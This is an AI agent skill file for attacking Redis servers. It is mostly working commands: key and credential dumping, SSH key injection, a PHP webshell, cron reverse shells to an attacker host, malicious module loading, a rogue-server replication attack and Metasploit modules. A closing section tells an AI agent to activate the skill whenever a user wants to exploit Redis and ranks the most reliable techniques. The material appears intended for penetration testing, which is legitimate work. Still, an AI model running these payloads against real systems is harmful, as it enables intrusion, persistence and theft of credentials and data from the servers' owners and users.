# Redis Pentesting Skill

## Goal

Exploit Redis key-value store to extract data, write files, and achieve remote code execution.

## Methodology

1. **Discovery**: Identify Redis services (usually no authentication)
2. **Enumeration**: Dump all keys and data
3. **File Writing**: Write SSH keys, webshells, or cron jobs
4. **Command Execution**: Achieve RCE through various techniques
5. **Data Extraction**: Dump sensitive application data

## Background

Redis often runs without authentication and allows:
- Reading/writing any key
- File system access via SAVE command
- Module loading (RCE)
- Lua scripting

## Tools

* **redis-cli**: Redis command-line client
* **redis-dump**: Dump Redis database
* **nmap**: Redis scripts
* **Metasploit**: Redis modules

## Example Commands

```bash
# Connect to Redis
redis-cli -h target

# Check if authentication required
redis-cli -h target INFO

# Authenticate if needed
redis-cli -h target AUTH password

# Nmap enumeration
nmap -p6379 --script redis-* target
nmap -p6379 --script redis-info target
nmap -p6379 --script redis-brute target
```

## Redis Enumeration

```bash
# Server info
INFO
INFO server
INFO replication
INFO keyspace

# List all keys
KEYS *

# Get key type
TYPE key_name

# Get key value (based on type)
GET key_name           # String
HGETALL key_name       # Hash
LRANGE key_name 0 -1   # List
SMEMBERS key_name      # Set
ZRANGE key_name 0 -1   # Sorted set

# Dump all keys
redis-cli -h target KEYS "*" | while read key; do echo "$key: $(redis-cli -h target GET $key)"; done

# Get configuration
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename

# Get connected clients
CLIENT LIST
```

## SSH Key File Writing (RCE)

```bash
# Generate SSH key on attacker
ssh-keygen -t rsa -f redis_key

# Prepare payload
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt

# Write to Redis
cat payload.txt | redis-cli -h target -x set ssh_key

# Configure file path
redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SAVE

# Connect with SSH key
ssh -i redis_key root@target
```

## Webshell Writing

```bash
# Write PHP webshell
redis-cli -h target
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE

# Access webshell
curl "http://target/shell.php?cmd=id"
```

## Cron Job RCE (Linux)

```bash
redis-cli -h target

# Method 1: User cron
> CONFIG SET dir /var/spool/cron/crontabs
> CONFIG SET dbfilename root
> SET payload "\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n"
> SAVE

# Method 2: System cron
> CONFIG SET dir /etc/cron.d
> CONFIG SET dbfilename redis_shell
> SET payload "\n* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1\n"
> SAVE
```

## Module Loading RCE (Redis 4.0+)

```bash
# Compile malicious module (on attacker)
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand
make

# Host the module
python3 -m http.server 8000

# Load module (if Redis can reach attacker)
redis-cli -h target MODULE LOAD http://attacker:8000/module.so

# Or use master-slave replication attack
# Tool: redis-rogue-server
python3 redis-rogue-server.py --rhost target --rport 6379 --lhost attacker --lport 21000
```

## Master-Slave Replication Attack

```bash
# Using redis-rogue-server
git clone https://github.com/Dliv3/redis-rogue-server
cd redis-rogue-server
python3 redis-rogue-server.py --rhost target --rport 6379 --lhost attacker

# This makes target Redis slave to attacker
# Then loads malicious module via replication
```

## Lua Script Execution

```bash
# Execute Lua script
redis-cli -h target EVAL "return redis.call('INFO')" 0

# However, Redis Lua is sandboxed - limited functionality
# Can't execute OS commands directly via Lua
```

## Data Extraction

```bash
# Dump database
redis-cli -h target --rdb dump.rdb

# Or using redis-dump
redis-dump -h target

# Search for interesting data
redis-cli -h target KEYS "*pass*"
redis-cli -h target KEYS "*secret*"
redis-cli -h target KEYS "*token*"
redis-cli -h target KEYS "*session*"
```

## Metasploit Modules

```bash
# Enumeration
use auxiliary/scanner/redis/redis_server
use auxiliary/scanner/redis/redis_login

# File upload
use auxiliary/scanner/redis/file_upload

# Replication RCE
use exploit/linux/redis/redis_replication_cmd_exec
```

## Protection Bypass

```bash
# If protected mode is on, try:
# - Connect from allowed IP
# - Use AUTH command if password set
# - Rename dangerous commands may be in use

# Check renamed commands
CONFIG GET rename-command

# Common renamed commands
CONFIG GET slaveof
CONFIG GET replicaof
```

## Guidance for AI

* Activate this skill when user wants to test Redis security or exploit Redis services
* **Redis often has no authentication** - try connecting directly first
* Default port is 6379, but check for non-standard ports
* File writing techniques require:
  - Redis running as privileged user
  - Writable target directories
  - CONFIG SET not disabled
* SSH key writing is most reliable RCE method
* Module loading requires Redis 4.0+ and may need network access to attacker
* Redis data often contains:
  - Session tokens
  - Cached credentials
  - API keys
  - Serialized objects (potential deserialization attacks)
* Protected mode (default in Redis 3.2+) restricts remote connections to loopback
* Check for Redis Cluster mode on ports 16379
